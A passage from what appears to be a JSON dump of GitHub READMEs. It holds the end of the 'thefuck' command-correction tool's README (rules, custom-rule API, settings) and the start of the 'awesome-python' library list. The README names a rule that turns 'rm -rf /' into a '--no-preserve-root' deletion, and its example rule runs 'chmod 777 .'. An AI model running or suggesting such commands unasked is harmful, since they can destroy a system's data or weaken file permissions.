`remove_shell_prompt_literal` &ndash; remove leading shell prompt symbol `$`, common when copying commands from documentations;\n* `remove_trailing_cedilla` &ndash; remove trailing cedillas `\u00e7`, a common typo for european keyboard layouts;\n* `rm_dir` &ndash; adds `-rf` when you try to remove a directory;\n* `scm_correction` &ndash; corrects wrong scm like `hg log` to `git log`;\n* `sed_unterminated_s` &ndash; adds missing '\/' to `sed`'s `s` commands;\n* `sl_ls` &ndash; changes `sl` to `ls`;\n* `ssh_known_hosts` &ndash; removes host from `known_hosts` on warning;\n* `sudo` &ndash; prepends `sudo` to previous command if it failed because of permissions;\n* `sudo_command_from_user_path` &ndash; runs commands from users `$PATH` with `sudo`;\n* `switch_lang` &ndash; switches command from your local layout to en;\n* `systemctl` &ndash; correctly orders parameters of confusing `systemctl`;\n* `terraform_init.py` &ndash; run `terraform init` before plan or apply;\n* `test.py` &ndash; runs `py.test` instead of `test.py`;\n* `touch` &ndash; creates missing directories before \"touching\";\n* `tsuru_login` &ndash; runs `tsuru login` if not authenticated or session expired;\n* `tsuru_not_command` &ndash; fixes wrong `tsuru` commands like `tsuru shell`;\n* `tmux` &ndash; fixes `tmux` commands;\n* `unknown_command` &ndash; fixes hadoop hdfs-style \"unknown command\", for example adds missing '-' to the command on `hdfs dfs ls`;\n* `unsudo` &ndash; removes `sudo` from previous command if a process refuses to run on super user privilege.\n* `vagrant_up` &ndash; starts up the vagrant instance;\n* `whois` &ndash; fixes `whois` command;\n* `workon_doesnt_exists` &ndash; fixes `virtualenvwrapper` env name os suggests to create new.\n* `yarn_alias` &ndash; fixes aliased `yarn` commands like `yarn ls`;\n* `yarn_command_not_found` &ndash; fixes misspelled `yarn` commands;\n* `yarn_command_replaced` &ndash; fixes replaced `yarn` commands;\n* `yarn_help` &ndash; makes it easier to open `yarn` documentation;\n\nThe following rules are enabled by default on specific platforms only:\n\n* `apt_get` &ndash; installs app from apt if it not installed (requires `python-commandnotfound` \/ `python3-commandnotfound`);\n* `apt_get_search` &ndash; changes trying to search using `apt-get` with searching using `apt-cache`;\n* `apt_invalid_operation` &ndash; fixes invalid `apt` and `apt-get` calls, like `apt-get isntall vim`;\n* `apt_list_upgradable` &ndash; helps you run `apt list --upgradable` after `apt update`;\n* `apt_upgrade` &ndash; helps you run `apt upgrade` after `apt list --upgradable`;\n* `brew_cask_dependency` &ndash; installs cask dependencies;\n* `brew_install` &ndash; fixes formula name for `brew install`;\n* `brew_reinstall` &ndash; turns `brew install <formula>` into `brew reinstall <formula>`;\n* `brew_link` &ndash; adds `--overwrite --dry-run` if linking fails;\n* `brew_uninstall` &ndash; adds `--force` to `brew uninstall` if multiple versions were installed;\n* `brew_unknown_command` &ndash; fixes wrong brew commands, for example `brew docto\/brew doctor`;\n* `brew_update_formula` &ndash; turns `brew update <formula>` into `brew upgrade <formula>`;\n* `dnf_no_such_command` &ndash; fixes mistyped DNF commands;\n* `nixos_cmd_not_found` &ndash; installs apps on NixOS;\n* `pacman` &ndash; installs app with `pacman` if it is not installed (uses `yay` or `yaourt` if available);\n* `pacman_not_found` &ndash; fixes package name with `pacman`, `yay` or `yaourt`.\n* `yum_invalid_operation` &ndash; fixes invalid `yum` calls, like `yum isntall vim`;\n\nThe following commands are bundled with *The Fuck*, but are not enabled by\ndefault:\n\n* `git_push_force` &ndash; adds `--force-with-lease` to a `git push` (may conflict with `git_push_pull`);\n* `rm_root` &ndash; adds `--no-preserve-root` to `rm -rf \/` command.\n\n## Creating your own rules\n\nTo add your own rule, create a file named `your-rule-name.py`\nin `~\/.config\/thefuck\/rules`. The rule file must contain two functions:\n\n```python\nmatch(command: Command) -> bool\nget_new_command(command: Command) -> str | list[str]\n```\n\nAdditionally, rules can contain optional functions:\n\n```python\nside_effect(old_command: Command, fixed_command: str) -> None\n```\nRules can also contain the optional variables `enabled_by_default`, `requires_output` and `priority`.\n\n`Command` has three attributes: `script`, `output` and `script_parts`.\nYour rule should not change `Command`.\n\n\n**Rules api changed in 3.0:** To access a rule's settings, import it with\n `from thefuck.conf import settings`\n\n`settings` is a special object assembled from `~\/.config\/thefuck\/settings.py`,\nand values from env ([see more below](#settings)).\n\nA simple example rule for running a script with `sudo`:\n\n```python\ndef match(command):\n    return ('permission denied' in command.output.lower()\n            or 'EACCES' in command.output)\n\n\ndef get_new_command(command):\n    return 'sudo {}'.format(command.script)\n\n# Optional:\nenabled_by_default = True\n\ndef side_effect(command, fixed_command):\n    subprocess.call('chmod 777 .', shell=True)\n\npriority = 1000  # Lower first, default is 1000\n\nrequires_output = True\n```\n\n[More examples of rules](https:\/\/github.com\/nvbn\/thefuck\/tree\/master\/thefuck\/rules),\n[utility functions for rules](https:\/\/github.com\/nvbn\/thefuck\/tree\/master\/thefuck\/utils.py),\n[app\/os-specific helpers](https:\/\/github.com\/nvbn\/thefuck\/tree\/master\/thefuck\/specific\/).\n\n## Settings\n\nSeveral *The Fuck* parameters can be changed in the file `$XDG_CONFIG_HOME\/thefuck\/settings.py`\n(`$XDG_CONFIG_HOME` defaults to `~\/.config`):\n\n* `rules` &ndash; list of enabled rules, by default `thefuck.const.DEFAULT_RULES`;\n* `exclude_rules` &ndash; list of disabled rules, by default `[]`;\n* `require_confirmation` &ndash; requires confirmation before running new command, by default `True`;\n* `wait_command` &ndash; max amount of time in seconds for getting previous command output;\n* `no_colors` &ndash; disable colored output;\n* `priority` &ndash; dict with rules priorities, rule with lower `priority` will be matched first;\n* `debug` &ndash; enables debug output, by default `False`;\n* `history_limit` &ndash; numeric value of how many history commands will be scanned, like `2000`;\n* `alter_history` &ndash; push fixed command to history, by default `True`;\n* `wait_slow_command` &ndash; max amount of time in seconds for getting previous command output if it in `slow_commands` list;\n* `slow_commands` &ndash; list of slow commands;\n* `num_close_matches` &ndash; maximum number of close matches to suggest, by default `3`.\n\nAn example of `settings.py`:\n\n```python\nrules = ['sudo', 'no_command']\nexclude_rules = ['git_push']\nrequire_confirmation = True\nwait_command = 10\nno_colors = False\npriority = {'sudo': 100, 'no_command': 9999}\ndebug = False\nhistory_limit = 9999\nwait_slow_command = 20\nslow_commands = ['react-native', 'gradle']\nnum_close_matches = 5\n```\n\nOr via environment variables:\n\n* `THEFUCK_RULES` &ndash; list of enabled rules, like `DEFAULT_RULES:rm_root` or `sudo:no_command`;\n* `THEFUCK_EXCLUDE_RULES` &ndash; list of disabled rules, like `git_pull:git_push`;\n* `THEFUCK_REQUIRE_CONFIRMATION` &ndash; require confirmation before running new command, `true\/false`;\n* `THEFUCK_WAIT_COMMAND` &ndash; max amount of time in seconds for getting previous command output;\n* `THEFUCK_NO_COLORS` &ndash; disable colored output, `true\/false`;\n* `THEFUCK_PRIORITY` &ndash; priority of the rules, like `no_command=9999:apt_get=100`,\nrule with lower `priority` will be matched first;\n* `THEFUCK_DEBUG` &ndash; enables debug output, `true\/false`;\n* `THEFUCK_HISTORY_LIMIT` &ndash; how many history commands will be scanned, like `2000`;\n* `THEFUCK_ALTER_HISTORY` &ndash; push fixed command to history `true\/false`;\n* `THEFUCK_WAIT_SLOW_COMMAND` &ndash; max amount of time in seconds for getting previous command output if it in `slow_commands` list;\n* `THEFUCK_SLOW_COMMANDS` &ndash; list of slow commands, like `lein:gradle`;\n* `THEFUCK_NUM_CLOSE_MATCHES` &ndash; maximum number of close matches to suggest, like `5`.\n\nFor example:\n\n```bash\nexport THEFUCK_RULES='sudo:no_command'\nexport THEFUCK_EXCLUDE_RULES='git_pull:git_push'\nexport THEFUCK_REQUIRE_CONFIRMATION='true'\nexport THEFUCK_WAIT_COMMAND=10\nexport THEFUCK_NO_COLORS='false'\nexport THEFUCK_PRIORITY='no_command=9999:apt_get=100'\nexport THEFUCK_HISTORY_LIMIT='2000'\nexport THEFUCK_NUM_CLOSE_MATCHES='5'\n```\n\n## Third-party packages with rules\n\nIf you'd like to make a specific set of non-public rules, but would still like\nto share them with others, create a package named `thefuck_contrib_*` with\nthe following structure:\n\n```\nthefuck_contrib_foo\n  thefuck_contrib_foo\n    rules\n      __init__.py\n      *third-party rules*\n    __init__.py\n    *third-party-utils*\n  setup.py\n```\n\n*The Fuck* will find rules located in the `rules` module.\n\n## Experimental instant mode\n\nThe default behavior of *The Fuck* requires time to re-run previous commands.\nWhen in instant mode, *The Fuck* saves time by logging output with [script](https:\/\/en.wikipedia.org\/wiki\/Script_(Unix)),\nthen reading the log.\n\n[![gif with instant mode][instant-mode-gif-link]][instant-mode-gif-link]\n\nCurrently, instant mode only supports Python 3 with bash or zsh. zsh's autocorrect function also needs to be disabled in order for thefuck to work properly.\n\nTo enable instant mode, add `--enable-experimental-instant-mode`\nto the alias initialization in `.bashrc`, `.bash_profile` or `.zshrc`.\n\nFor example:\n\n```bash\neval $(thefuck --alias --enable-experimental-instant-mode)\n```\n\n## Developing\n\nSee [CONTRIBUTING.md](CONTRIBUTING.md)\n\n## License MIT\nProject License can be found [here](LICENSE.md).\n\n\n[version-badge]:   https:\/\/img.shields.io\/pypi\/v\/thefuck.svg?label=version\n[version-link]:    https:\/\/pypi.python.org\/pypi\/thefuck\/\n[travis-badge]:    https:\/\/travis-ci.org\/nvbn\/thefuck.svg?branch=master\n[travis-link]:     https:\/\/travis-ci.org\/nvbn\/thefuck\n[appveyor-badge]:  https:\/\/ci.appveyor.com\/api\/projects\/status\/1sskj4imj02um0gu\/branch\/master?svg=true\n[appveyor-link]:   https:\/\/ci.appveyor.com\/project\/nvbn\/thefuck\n[coverage-badge]:  https:\/\/img.shields.io\/coveralls\/nvbn\/thefuck.svg\n[coverage-link]:   https:\/\/coveralls.io\/github\/nvbn\/thefuck\n[license-badge]:   https:\/\/img.shields.io\/badge\/license-MIT-007EC7.svg\n[examples-link]:   https:\/\/raw.githubusercontent.com\/nvbn\/thefuck\/master\/example.gif\n[instant-mode-gif-link]:   https:\/\/raw.githubusercontent.com\/nvbn\/thefuck\/master\/example_instant_mode.gif\n[homebrew]:        https:\/\/brew.sh\/\n[linuxbrew]:       https:\/\/linuxbrew.sh\/\n"},{"repo":"\/vinta\/awesome-python","language":"Python","readme_contents":"# Awesome Python [![Awesome](https:\/\/cdn.rawgit.com\/sindresorhus\/awesome\/d7305f38d29fed78fa85652e3a63e154dd8e8829\/media\/badge.svg)](https:\/\/github.com\/sindresorhus\/awesome)\n\nA curated list of awesome Python frameworks, libraries, software and resources.\n\nInspired by [awesome-php](https:\/\/github.com\/ziadoz\/awesome-php).\n\n- [Awesome Python](#awesome-python)\n    - [Admin Panels](#admin-panels)\n    - [Algorithms and Design Patterns](#algorithms-and-design-patterns)\n    - [Asynchronous Programming](#asynchronous-programming)\n    - [Audio](#audio)\n    - [Authentication](#authentication)\n    - [Build Tools](#build-tools)\n    - [Built-in Classes Enhancement](#built-in-classes-enhancement)\n    - [Caching](#caching)\n    - [ChatOps Tools](#chatops-tools)\n    - [CMS](#cms)\n    - [Code Analysis](#code-analysis)\n    - [Command-line Interface Development](#command-line-interface-development)\n    - [Command-line Tools](#command-line-tools)\n    - [Compatibility](#compatibility)\n    - [Computer Vision](#computer-vision)\n    - [Concurrency and Parallelism](#concurrency-and-parallelism)\n    - [Configuration](#configuration)\n    - [Cryptography](#cryptography)\n    - [Data Analysis](#data-analysis)\n    - [Data Validation](#data-validation)\n    - [Data Visualization](#data-visualization)\n    - [Database Drivers](#database-drivers)\n    - [Database](#database)\n    - [Date and Time](#date-and-time)\n    - [Debugging Tools](#debugging-tools)\n    - [Deep Learning](#deep-learning)\n    - [DevOps Tools](#devops-tools)\n    - [Distributed Computing](#distributed-computing)\n    - [Distribution](#distribution)\n    - [Documentation](#documentation)\n    - [Downloader](#downloader)\n    - [E-commerce](#e-commerce)\n    - [Editor Plugins and IDEs](#editor-plugins-and-ides)\n    - [Email](#email)\n    - [Environment Management](#environment-management)\n    - [Files](#files)\n    - [Foreign Function Interface](#foreign-function-interface)\n    - [Forms](#forms)\n    - [Functional Programming](#functional-programming)\n    - [Game Development](#game-development)\n    - [Geolocation](#geolocation)\n    - [GUI Development](#gui-development)\n    - [Hardware](#hardware)\n    - [HTML Manipulation](#html-manipulation)\n    - [HTTP Clients](#http-clients)\n    - [Image Processing](#image-processing)\n    - [Implementations](#implementations)\n    - [Interactive Interpreter](#interactive-interpreter)\n    - [Internationalization](#internationalization)\n    - [Job Scheduler](#job-scheduler)\n    - [Logging](#logging)\n    - [Machine Learning](#machine-learning)\n    - [Miscellaneous](#miscellaneous)\n    - [Natural Language Processing](#natural-language-processing)\n    - [Network Virtualization](#network-virtualization)\n    - [News Feed](#news-feed)\n    - [ORM](#orm)\n    - [Package Management](#package-management)\n    - [Package Repositories](#package-repositories)\n    - [Permissions](#permissions)\n    - [Processes](#processes)\n    - [Recommender Systems](#recommender-systems)\n    - [RESTful API](#restful-api)\n    - [Robotics](#robotics)\n    - [RPC Servers](#rpc-servers)\n    - [Science](#science)\n    - [Search](#search)\n    - [Serialization](#serialization)\n    - [Serverless Frameworks](#serverless-frameworks)\n    - [Specific Formats Processing](#specific-formats-processing)\n    - [Static Site Generator](#static-site-generator)\n    - [Tagging](#tagging)\n    - [Task Queues](#task-queues)\n    - [Template Engine](#template-engine)\n    - [Testing](#testing)\n    - [Text Processing](#text-processing)\n    - [Third-party APIs](#third-party-apis)\n    - [URL Manipulation](#url-manipulation)\n    - [Video](#video)\n    - [Web Asset Management](#web-asset-management)\n    - [Web Content Extracting](#web-content-extracting)\n    - [Web Crawling](#web-crawling)\n    - [Web Frameworks](#web-frameworks)\n    - [WebSocket](#websocket)\n    - [WSGI Servers](#wsgi-servers)\n- [Resources](#resources)\n    - [Podcasts](#podcasts)\n    - [Twitter](#twitter)\n    - [Websites](#websites)\n    - [Weekly](#weekly)\n- [Contributing](#contributing)\n\n---\n\n## Admin Panels\n\n*Libraries for administrative interfaces.*\n\n* [ajenti](https:\/\/github.com\/ajenti\/ajenti) - The admin panel your servers deserve.\n* [django-grappelli](https:\/\/grappelliproject.com\/) - A jazzy skin for the Django Admin-Interface.\n* [django-jet](https:\/\/github.com\/geex-arts\/django-jet) - Modern responsive template for the Django admin interface with improved functionality.\n* [django-suit](https:\/\/djangosuit.com\/) - Alternative Django Admin-Interface (free only for Non-commercial use).\n* [django-xadmin](https:\/\/github.com\/sshwsfc\/xadmin) - Drop-in replacement of Django admin comes with lots of goodies.\n* [jet-bridge](https:\/\/github.com\/jet-admin\/jet-bridge) - Admin panel framework for any application with nice UI (ex Jet Django)\n* [flask-admin](https:\/\/github.com\/flask-admin\/flask-admin) - Simple and extensible administrative interface framework for Flask.\n* [flower](https:\/\/github.com\/mher\/flower) - Real-time monitor and web admin for Celery.\n* [wooey](https:\/\/github.com\/wooey\/wooey) - A Django app which creates automatic web UIs for Python scripts.\n\n## Algorithms and Design Patterns\n\n*Python implementation of algorithms and design patterns.*\n\n* [algorithms](https:\/\/github.com\/keon\/algorithms) - Minimal examples of data structures and algorithms in Python.\n* [PyPattyrn](https:\/\/github.com\/tylerlaberge\/PyPattyrn) - A simple yet effective library for implementing common design patterns.\n* [python-patterns](https:\/\/github.com\/faif\/python-patterns) - A collection of design patterns in Python.\n* [sortedcontainers](https:\/\/github.com\/grantjenks\/python-sortedcontainers) - Fast, pure-Python implementation of SortedList, SortedDict, and SortedSet types.\n\n## Asynchronous Programming\n\n* [asyncio](https:\/\/docs.python.org\/3\/library\/asyncio.html) - (Python standard library) Asynchronous I\/O, event loop, coroutines and tasks.\n    - [awesome-asyncio](https:\/\/github.com\/timofurrer\/awesome-asyncio)\n* [uvloop](https:\/\/github.com\/MagicStack\/uvloop) - Ultra fast asyncio event loop.\n* [Twisted](https:\/\/twistedmatrix.com\/trac\/) - An event-driven networking engine.\n\n## Audio\n\n*Libraries for manipulating audio and its metadata.*\n\n* Audio\n    * [audioread](https:\/\/github.com\/beetbox\/audioread) - Cross-library (GStreamer + Core Audio + MAD + FFmpeg) audio decoding.\n    * [dejavu](https:\/\/github.com\/worldveil\/dejavu) - Audio fingerprinting and recognition.\n    * [mingus](http:\/\/bspaans.github.io\/python-mingus\/) - An advanced music theory and notation package with MIDI file and playback support.\n    * [pyAudioAnalysis](https:\/\/github.com\/tyiannak\/pyAudioAnalysis) - Audio feature extraction, classification, segmentation and applications.\n    * [pydub](https:\/\/github.com\/jiaaro\/pydub) - Manipulate audio with a simple and easy high level interface.\n    * [TimeSide](https:\/\/github.com\/Parisson\/TimeSide) - Open web audio processing framework.\n* Metadata\n    * [beets](https:\/\/github.com\/beetbox\/beets) - A music library manager and [MusicBrainz](https:\/\/musicbrainz.org\/) tagger.\n    * [eyeD3](https:\/\/github.com\/nicfit\/eyeD3) - A tool for working with audio files, specifically MP3 files containing ID3 metadata.\n    * [mutagen](https:\/\/github.com\/quodlibet\/mutagen) - A Python module to handle audio metadata.\n    * [tinytag](https:\/\/github.com\/devsnd\/tinytag) - A library for reading music meta data of MP3, OGG, FLAC and Wave files.\n\n## Authentication\n\n*Libraries for implementing authentications schemes.*\n\n* OAuth\n    * [authlib](https:\/\/github.com\/lepture\/authlib) - JavaScript Object Signing and Encryption draft implementation.\n    * [django-allauth](https:\/\/github.com\/pennersr\/django-allauth) - Authentication app for Django that \"just works.\"\n    * [django-oauth-toolkit](https:\/\/github.com\/evonove\/django-oauth-toolkit) - OAuth 2 goodies for Django.\n    * [oauthlib](https:\/\/github.com\/idan\/oauthlib) - A generic and thorough implementation of the OAuth request-signing logic.\n    * [python-oauth2](https:\/\/github.com\/joestump\/python-oauth2) - A fully tested, abstract interface to creating OAuth clients and servers.\n    * [python-social-auth](https:\/\/github.com\/omab\/python-social-auth) - An easy-to-setup social authentication mechanism.\n* JWT\n    * [pyjwt](https:\/\/github.com\/jpadilla\/pyjwt) - JSON Web Token implementation in Python.\n    * [python-jose](https:\/\/github.com\/mpdavis\/python-jose\/) - A JOSE implementation in Python.\n    * [python-jwt](https:\/\/github.com\/davedoesdev\/python-jwt) - A module for generating and verifying JSON Web Tokens.\n\n## Build Tools\n\n*Compile software from source code.*\n\n* [BitBake](http:\/\/www.yoctoproject.org\/docs\/1.6\/bitbake-user-manual\/bitbake-user-manual.html) - A make-like build tool for embedded Linux.\n* [buildout](http:\/\/www.buildout.org\/en\/latest\/) - A build system for creating, assembling and deploying applications from multiple parts.\n* [PlatformIO](https:\/\/github.com\/platformio\/platformio-core) - A console tool to build code with different development platforms.\n* [pybuilder](https:\/\/github.com\/pybuilder\/pybuilder) - A continuous build tool written in pure Python.\n* [SCons](http:\/\/www.scons.org\/) - A software construction tool.\n\n## Built-in Classes Enhancement\n\n*Libraries for enhancing Python built-in classes.*\n\n* [dataclasses](https:\/\/docs.python.org\/3\/library\/dataclasses.html) - (Python standard library) Data classes.\n* [attrs](https:\/\/github.com\/python-attrs\/attrs) - Replacement for `__init__`, `__eq__`, `__repr__`, etc. boilerplate in class definitions.\n* [bidict](https:\/\/github.com\/jab\/bidict) - Efficient, Pythonic bidirectional map data structures and related functionality..\n* [Box](https:\/\/github.com\/cdgriffith\/Box) - Python dictionaries with advanced dot notation access.\n* [DottedDict](https:\/\/github.com\/carlosescri\/DottedDict) - A library that provides a method of accessing lists and dicts with a dotted path notation.\n\n## CMS\n\n*Content Management Systems.*\n\n* [wagtail](https:\/\/wagtail.io\/) - A Django content management system.\n* [django-cms](https:\/\/www.django-cms.org\/en\/) - An Open source enterprise CMS based on the Django.\n* [feincms](https:\/\/github.com\/feincms\/feincms) - One of the most advanced Content Management Systems built on Django.\n* [Kotti](https:\/\/github.com\/Kotti\/Kotti) - A high-level, Pythonic web application framework built on Pyramid.\n* [mezzanine](https:\/\/github.com\/stephenmcd\/mezzanine) - A powerful, consistent, and flexible content management platform.\n* [plone](https:\/\/plone.org\/) - A CMS built on top of the open source application server Zope.\n* [quokka](https:\/\/github.com\/rochacbruno\/quokka) - Flexible, extensible, small CMS powered by Flask and MongoDB.\n\n## Caching\n\n*Libraries for caching data.*\n\n* [beaker](https:\/\/github.com\/bbangert\/beaker) - A WSGI middleware for sessions and caching.\n* [django-cache-machine](https:\/\/github.com\/django-cache-machine\/django-cache-machine) - Automatic caching and invalidation for Django models.\n* [django-cacheops](https:\/\/github.com\/Suor\/django-cacheops) - A slick ORM cache with automatic granular event-driven invalidation.\n* [dogpile.cache](http:\/\/dogpilecache.readthedocs.io\/en\/latest\/) - dogpile.cache is next generation replacement for Beaker made by same authors.\n* [HermesCache](https:\/\/pypi.org\/project\/HermesCache\/) - Python caching library with tag-based invalidation and dogpile effect prevention.\n* [pylibmc](https:\/\/github.com\/lericson\/pylibmc) - A Python wrapper around the [libmemcached](https:\/\/libmemcached.org\/libMemcached.html) interface.\n* [python-diskcache](http:\/\/www.grantjenks.com\/docs\/diskcache\/) - SQLite and file backed cache backend with faster lookups than memcached and redis.\n\n## ChatOps Tools\n\n*Libraries for chatbot development.*\n\n* [errbot](https:\/\/github.com\/errbotio\/errbot\/) - The easiest and most popular chatbot to implement ChatOps.\n\n## Code Analysis\n\n*Tools of static analysis, linters and code quality checkers. Also see [awesome-static-analysis](https:\/\/github.com\/mre\/awesome-static-analysis).*\n\n* Code Analysis\n    * [coala](https:\/\/github.com\/coala\/coala\/) - Language independent and easily extendable code analysis application.\n    * [code2flow](https:\/\/github.com\/scottrogowski\/code2flow) - Turn your Python and JavaScript code into DOT flowcharts.\n    * [prospector](https:\/\/github.com\/PyCQA\/prospector) - A tool to analyse Python code.\n    * [pycallgraph](https:\/\/github.com\/gak\/pycallgraph) - A library that visualises the flow (call graph) of your Python application.\n* Code Linters\n    * [flake8](https:\/\/pypi.org\/project\/flake8\/) - A wrapper around `pycodestyle`, `pyflakes` and McCabe.\n        * [awesome-flake8-extensions](https:\/\/github.com\/DmytroLitvinov\/awesome-flake8-extensions)\n    * [pylint](https:\/\/www.pylint.org\/) - A fully customizable source code analyzer.\n    * [pylama](https:\/\/github.com\/klen\/pylama) - A code audit tool for Python and JavaScript.\n    * [wemake-python-styleguide](https:\/\/github.com\/wemake-services\/wemake-python-styleguide) - The strictest and most opinionated python linter ever.\n* Code Formatters\n    * [black](https:\/\/github.com\/python\/black) - The uncompromising Python code formatter.\n    * [yapf](https:\/\/github.com\/google\/yapf) - Yet another Python code formatter from Google.\n* Static Type Checkers, also see [awesome-python-typing](https:\/\/github.com\/typeddjango\/awesome-python-typing)\n    * [mypy](http:\/\/mypy-lang.org\/) - Check variable types during compile time.\n    * [pyre-check](https:\/\/github.com\/facebook\/pyre-check) - Performant type checking.\n* Static Type Annotations Generators\n    * [MonkeyType](https:\/\/github.com\/Instagram\/MonkeyType) - A system for Python that generates static type annotations by collecting runtime types\n\n## Command-line Interface Development\n\n*Libraries for building command-line applications.*\n\n* Command-line Application Development\n    * [cement](http:\/\/builtoncement.com\/) - CLI Application Framework for Python.\n    * [click](http:\/\/click.pocoo.org\/dev\/) - A package for creating beautiful command line interfaces in a composable way.\n    * [cliff](https:\/\/docs.openstack.org\/developer\/cliff\/) - A framework for creating command-line programs with multi-level commands.\n    * [clint](https:\/\/github.com\/kennethreitz\/clint) - Python Command-line Application Tools.\n    * [docopt](http:\/\/docopt.org\/) - Pythonic command line arguments parser.\n    * [python-fire](https:\/\/github.com\/google\/python-fire) - A library for creating command line interfaces from absolutely any Python object.\n    * [python-prompt-toolkit](https:\/\/github.com\/jonathanslenders\/python-prompt-toolkit) - A library for building powerful interactive command lines.\n* Terminal Rendering\n    * [asciimatics](https:\/\/github.com\/peterbrittain\/asciimatics) - A package to create full-screen text UIs (from interactive forms to ASCII animations).\n    * [bashplotlib](https:\/\/github.com\/glamp\/bashplotlib) - Making basic plots in the terminal.\n    * [colorama](https:\/\/pypi.org\/project\/colorama\/) - Cross-platform colored terminal text.\n    * [tqdm](https:\/\/github.com\/tqdm\/tqdm) - Fast, extensible progress bar for loops and CLI.\n\n## Command-line Tools\n\n*Useful CLI-based tools for productivity.*\n\n* Productivity Tools\n    * [cookiecutter](https:\/\/github.com\/audreyr\/cookiecutter) - A command-line utility that creates projects from cookiecutters (project templates).\n    * [doitlive](https:\/\/github.com\/sloria\/doitlive) - A tool for live presentations in the terminal.\n    * [howdoi](https:\/\/github.com\/gleitz\/howdoi) - Instant coding answers via the command line.\n    * [PathPicker](https:\/\/github.com\/facebook\/PathPicker) - Select files out of bash output.\n    * [percol](https:\/\/github.com\/mooz\/percol) - Adds flavor of interactive selection to the traditional pipe concept on UNIX.\n    * [thefuck](https:\/\/github.com\/nvbn\/thefuck) - Correcting your previous console command.\n    * [tmuxp](https:\/\/github.com\/tony\/tmuxp) - A [tmux](https:\/\/github.com\/tmux\/tmux) session manager.\n    * [try](https:\/\/github.com\/timofurrer\/try) - A dead simple CLI to try out python packages - it's never been easier.\n* CLI Enhancements\n    * [httpie](https:\/\/github.com\/jakubroztocil\/httpie) - A command line HTTP client, a user-friendly cURL replacement.\n    * [kube-shell](https:\/\/github.com\/cloudnativelabs\/kube-shell) - An integrated shell for working with the Kubernetes CLI.\n    * [mycli](https:\/\/github.com\/dbcli\/mycli) - A Terminal Client for MySQL with AutoCompletion and Syntax Highlighting.\n    * [pgcli](https:\/\/github.com\/dbcli\/pgcli) - Postgres CLI with autocompletion and syntax highlighting.\n    * [saws](https:\/\/github.com\/donnemartin\/saws) - A Supercharged [aws-cli](https:\/\/github.com\/aws\/aws-cli).\n\n## Compatibility\n\n*Libraries for migrating from Python 2 to 3.*\n\n* [python-future](http:\/\/python-future.org\/index.html) - The missing compatibility layer between Python 2 and Python 3.\n* [python-modernize](https:\/\/github.com\/mitsuhiko\/python-modernize) - Modernizes Python code for eventual Python 3 migration.\n* [six](https:\/\/pypi.org\/project\/six\/) - Python 2 and 3 compatibility utilities.\n\n## Computer Vision\n\n*Libraries for computer vision.*\n\n* [OpenCV](https:\/\/opencv.org\/) - Open Source Computer Vision Library.\n* [pytesseract](https:\/\/github.com\/madmaze\/pytesseract) - Another wrapper for [Google Tesseract OCR](https:\/\/github.com\/tesseract-ocr).\n* [SimpleCV](http:\/\/simplecv.org\/) - An open source framework for building computer vision applications.\n\n## Concurrency and Parallelism\n\n*Libraries for concurrent and parallel execution. Also see [awesome-asyncio](https:\/\/github.com\/timofurrer\/awesome-asyncio).*\n\n* [concurrent.futures](https:\/\/docs.python.org\/3\/library\/concurrent.futures.html) - (Python standard library) A high-level interface for asynchronously executing callables.\n* [multiprocessing](https:\/\/docs.python.org\/3\/library\/multiprocessing.html) - (Python standard library) Process-based parallelism.\n* [eventlet](http:\/\/eventlet.net\/) - Asynchronous framework with WSGI support.\n* [gevent](http:\/\/www.gevent.org\/) - A coroutine-based Python networking library that uses [greenlet](https:\/\/github.com\/python-greenlet\/greenlet).\n* [uvloop](https:\/\/github.com\/MagicStack\/uvloop) - Ultra fast implementation of `asyncio` event loop on top of `libuv`.\n* [scoop](https:\/\/github.com\/soravux\/scoop) - Scalable Concurrent Operations in Python.\n\n## Configuration\n\n*Libraries for storing and parsing configuration options.*\n\n* [configobj](https:\/\/github.com\/DiffSK\/configobj) - INI file parser with validation.\n* [configparser](https:\/\/docs.python.org\/3\/library\/configparser.html) - (Python standard library) INI file parser.\n* [profig](https:\/\/profig.readthedocs.io\/en\/default\/) - Config from multiple formats with value conversion.\n* [python-decouple](https:\/\/github.com\/henriquebastos\/python-decouple) - Strict separation of settings from code.\n\n## Cryptography\n\n* [cryptography](https:\/\/cryptography.io\/en\/latest\/) - A package designed to expose cryptographic primitives and recipes to Python developers.\n* [paramiko](https:\/\/github.com\/paramiko\/paramiko) - The leading native Python SSHv2 protocol library.\n* [passlib](https:\/\/passlib.readthedocs.io\/en\/stable\/) - Secure password storage\/hashing library, very high level.\n* [pynacl](https:\/\/github.com\/pyca\/pynacl) - Python binding to the Networking and Cryptography (NaCl) library.\n\n## Data Analysis\n\n*Libraries for data analyzing.*\n\n* [Blaze](https:\/\/github.com\/blaze\/blaze) - NumPy and Pandas interface to Big Data.\n* [Open Mining](https:\/\/github.com\/mining\/mining) - Business Intelligence (BI) in Pandas interface.\n* [Orange](https:\/\/orange.biolab.si\/) - Data mining, data visualization, analysis and machine learning through visual programming or scripts.\n* [Pandas](http:\/\/pandas.pydata.org\/) - A library providing high-performance, easy-to-use data structures and data analysis tools.\n* [Optimus](https:\/\/github.com\/ironmussa\/Optimus) - Agile Data Science Workflows made easy with PySpark.\n\n## Data Validation\n\n*Libraries for validating data. Used for forms in many cases.*\n\n* [Cerberus](https:\/\/github.com\/pyeve\/cerberus) - A lightweight and extensible data validation library.\n* [colander](https:\/\/docs.pylonsproject.org\/projects\/colander\/en\/latest\/) - Validating and deserializing data obtained via XML, JSON, an HTML form post.\n* [jsonschema](https:\/\/github.com\/Julian\/jsonschema) - An implementation of [JSON Schema](http:\/\/json-schema.org\/) for Python.\n* [schema](https:\/\/github.com\/keleshev\/schema) - A library for validating Python data structures.\n* [Schematics](https:\/\/github.com\/schematics\/schematics) - Data Structure Validation.\n* [valideer](https:\/\/github.com\/podio\/valideer) - Lightweight extensible data validation and adaptation library.\n* [voluptuous](https:\/\/github.com\/alecthomas\/voluptuous) - A Python data validation library.\n\n## Data Visualization\n\n*Libraries for visualizing data. Also see [awesome-javascript](https:\/\/github.com\/sorrycc\/awesome-javascript#data-visualization).*\n\n* [Altair](https:\/\/github.com\/altair-viz\/altair) - Declarative statistical visualization library for Python.\n* [Bokeh](https:\/\/github.com\/bokeh\/bokeh) - Interactive Web Plotting for Python.\n* [bqplot](https:\/\/github.com\/bloomberg\/bqplot) - Interactive Plotting Library for the Jupyter Notebook\n* [Dash](https:\/\/plot.ly\/products\/dash\/) - Built on top of Flask, React and Plotly aimed at analytical web applications.\n    * [awesome-dash](https:\/\/github.com\/Acrotrend\/awesome-dash)\n* [plotnine](https:\/\/github.com\/has2k1\/plotnine) - A grammar of graphics for Python based on 